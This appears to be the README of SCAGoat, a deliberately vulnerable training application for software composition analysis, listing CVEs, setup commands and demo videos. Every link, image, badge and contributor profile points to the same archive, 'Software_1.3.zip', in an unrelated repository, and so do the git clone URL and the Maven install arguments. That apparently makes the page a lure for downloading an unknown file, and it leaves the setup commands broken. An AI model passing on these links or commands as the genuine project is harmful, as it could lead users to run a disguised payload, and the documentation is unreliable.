<p align="center">
    <img src="https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip" alt="SCA Goat">
     <br>SCA Goat<br> Navigating SCA Vulnerabilities, Empowering Mastery<br> <p align="center">
</p>
</p>


## What is SCA-Goat?

SCAGoat is an application for Software Composition Analysis (SCA) that focuses on vulnerable and compromised JAR dependencies used in development code, providing users with hands-on learning opportunities to understand potential attack scenarios. It is designed to identify vulnerabilities that may arise from using vulnerable JAR files.

## ⚠️ WARNING: Educational Purpose Only ⚠️

This project contains deliberately vulnerable and malicious code for educational purposes. The xz-java-malicious package included in this project simulates a compromised library and should NEVER be used in production environments. This package is designed solely for training security professionals and for evaluating SCA tools.

## Presented at:
- [DC32: Demo Labs](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
- [Appsec Village: Arsenal](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
- [Blackhat Europe 2024](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
- [Blackhat Asia 2025](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)

## What All CVE Covered?

The CVEs covered under SCAGoat are primarily critical and high severity, which have a CVSS score of 9. This aid in understanding the vulnerable package being used and its potential for exploitation. 

In addition, there is one compromised package, that lacks a CVE, but is malicious by nature and cannot be detected with traditional SCA scanners.

| CVE                        | Package Name    | Link  | 
|----------------------------|-----------------|-------|
| CVE-2023-42282             | IP              | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) |     
| CVE-2017-1000427           | Marked          | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) |     
| CVE-2017-16114             | Marked          | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) |
| CVE-2021-44228             | log4j           | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
| CVE-2020-9547              | jackson-databind | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
| CVE-2021-33623             | trim-newlines   | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
| CVE-2020-13935             | spring-websocket | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
| CVE-2019-10744             | lodash          | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
| CVE-2019-8331              | pug             | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
| CVE-2020-8116              | dot-prop        | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
| Malicious Package (No CVE) | xz-java         | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|



## Steps to run SCAGoat
Step 1. Clone the application
```bash
git clone https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip
```
Step 2. Go to the Directory
```bash
cd Damn-vulnerable-sca
```
Step 3. Use the following docker commands to build the image for the dockerfile and run the image to access the application:
```bash
docker compose up
```
Step 4. Visit http://localhost:3000/ to access the nodejs application and http://localhost:8080 for Springboot for log4j

## Compiling and Installing the Malicious XZ-Java Package Locally

To ensure SCAGoat functions correctly for training and SCA tool evaluations, you'll need to compile and install the xz-java-malicious package locally:

1. Navigate to the xz-java-malicious directory:
```bash
cd xz-java-malicious
```

2. Compile and install the package to your local Maven repository:
```bash
mvn clean install
```

3. Verify the installation:
```bash
mvn dependency:tree
```

4. After successful installation, add the malicious package to your .m2 repo by running following command
```bash
mvn install:install-file \
  https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip \
  https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip \
  -DartifactId=xz \
  -Dversion=1.9.2-malicious \
  -Dpackaging=jar
```

5. Return to the main project directory:
```bash
cd ..
```

6. Now you can run the full application with docker compose as mentioned above.

### Important Notes:
- The malicious package is deliberately designed to be undetectable by some SCA tools, making it an excellent training tool.
- This package doesn't contain actual harmful code but simulates patterns of compromised libraries.
- Use in isolated, educational environments only.

### SCA Goat HomePage
![SCAGoat HomePage](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)

## Vulnerability Dashboard

SCAGoat features an interactive vulnerability dashboard that allows users to explore and understand different types of vulnerabilities:

- **Marked (CVE-2017-16114)**: Cross-Site Scripting vulnerability in the Markdown parser
- **Trim-Newlines (CVE-2021-33623)**: Regular Expression Denial of Service vulnerability
- **Lodash (CVE-2019-10744)**: Critical prototype pollution vulnerability with CVSS 9.8
- **Jackson-Databind (CVE-2020-9547)**: Deserialization vulnerability in the backend
- **XZ-Java (Malicious)**: Compromised library demonstration
- **WebSocket (CVE-2020-13935)**: Spring WebSocket vulnerability
- **Log4j (CVE-2021-44228)**: Log4Shell vulnerability demonstration
- **Pug (CVE-2019-8331)**: Denial of Service vulnerability in the template engine
- **Dot-Prop (CVE-2020-8116)**: Prototype pollution vulnerability allowing property manipulation

Each vulnerability includes an interactive demo to help security professionals, developers, and students understand how these vulnerabilities work and how they can be exploited.

## What's Coming?

Our aim is to provide you with a better understanding of vulnerable packages and JAR dependencies so that you can gain hands-on experience. We will keep you updated with the latest CVEs. Stay tuned! 

## Tutorials to exploit the vulnerability:

|  Demo Videos | CVE Exploited |
|---------------|-----------|
| [Demo 1](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) |    CVE-2023-42282 |           
| [Demo 2](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) |     CVE-2017-16114 |     
| [Demo 3](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) |     CVE-2021-44228 |
| [Demo 4](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) | CVE-2020-9547 |
| [Demo 5](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) | XZ-JAVA compromised |
| [Demo 6](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) | CVE-2019-10744 (Lodash) |
| [Demo 8]() | CVE-2019-8331 (Pug) |
| [Demo 9]() | CVE-2020-8116 (Dot-Prop) |

## SCA Scan Reports
- [Link to SCAGoat Scan Reports](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
- [Detailed Dependency Check Tool Report](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)

## UI Enhancements

The SCAGoat application features a modern, responsive UI with the following features:

- Interactive vulnerability dashboard with informative cards
- Dark mode interface with https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip background
- Detailed information about each vulnerability including CVSS scores
- Real-time demonstration of exploits
- Mobile-friendly responsive design

## Want to contribute? 
[![Fork this project](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
[![Start contributing](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
<br>Awesome! The most basic way to show your support is to star the project or raise issues.

## Contributors
Thanks to all the people who already contributed!  
[Prashant Venkatesh](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)    
[Nandan Gupta](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)  
[Hare Krishna Rai](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)  
[Henrik Plate](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)  
[Gaurav Joshi](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)  
[Yoad Fekete](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) 

<a href="https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip">
  <img src="https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip" />
</a>


